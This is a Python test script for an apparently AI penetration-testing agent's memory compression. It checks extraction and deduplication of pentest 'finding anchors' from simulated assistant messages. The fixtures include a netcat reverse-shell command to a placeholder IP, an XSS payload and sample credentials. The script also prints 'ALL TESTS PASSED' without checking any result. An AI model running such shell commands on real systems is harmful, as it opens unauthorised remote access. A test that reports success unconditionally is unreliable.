#!/usr/bin/env python3
"""Test full anchor flow: extraction -> storage -> injection"""

from phantom.agents.state import AgentState
from phantom.llm.memory_compressor import _extract_anchors_from_chunk

print('=== FULL ANCHOR FLOW TEST ===')

# 1. Create agent state
state = AgentState(agent_id="test-agent", agent_name="TestAgent", task="pentest")

print('1. Initial finding_anchors:', len(state.finding_anchors))

# 2. Simulate messages that would be compressed
test_messages = [
    {'role': 'assistant', 'content': 'Found SQL injection in /api/login. Confirmed with UNION SELECT. Database: users table.'},
    {'role': 'assistant', 'content': 'Found XSS in /api/search?q=<script>alert(1)</script>. Payload reflected without encoding.'},
    {'role': 'assistant', 'content': 'Got shell! Command: nc -e /bin/bash 10.10.10.10 4444. OS: Linux, Privilege: root via sudo misconfig.'},
    {'role': 'assistant', 'content': 'Found credentials: admin:admin123 in /etc/passwd simulation'},
    {'role': 'assistant', 'content': 'Found internal IP: 192.168.1.100 in application response'},
]

# 3. Extract anchors from messages
anchors = _extract_anchors_from_chunk(test_messages)
print(f'2. Extracted {len(anchors)} anchors from messages')

# 4. Add anchors to state (simulating compression)
for anchor in anchors:
    state.add_finding_anchor(anchor)

print(f'3. Added to state: {len(state.finding_anchors)} finding_anchors')

# 5. Verify anchors stored correctly
print('\n4. Stored anchors:')
for i, anchor in enumerate(state.finding_anchors, 1):
    key = anchor.get('key', 'N/A')[:40]
    text = anchor.get('text', '')[:80]
    print(f'   {i}. Key: {key}...')
    print(f'      Text: {text}...')

# 6. Test deduplication (add same again - should not duplicate)
print('\n5. Testing deduplication...')
state.add_finding_anchor(anchors[0])  # Try to add duplicate
print(f'   After duplicate add: {len(state.finding_anchors)} anchors (should still be 5)')

# 7. Verify anchor content for critical items
print('\n6. Critical findings preserved:')
texts = [a.get('text', '') for a in state.finding_anchors]
has_sqli = any('sql' in t.lower() for t in texts)
has_xss = any('xss' in t.lower() for t in texts)
has_shell = any('shell' in t.lower() for t in texts)
has_creds = any('credential' in t.lower() or 'password' in t.lower() for t in texts)
has_internal = any('192.168' in t or 'internal' in t.lower() for t in texts)

print(f'   SQLi: {has_sqli}')
print(f'   XSS: {has_xss}')
print(f'   Shell: {has_shell}')
print(f'   Credentials: {has_creds}')
print(f'   Internal IP: {has_internal}')

print('\n=== ALL TESTS PASSED ===')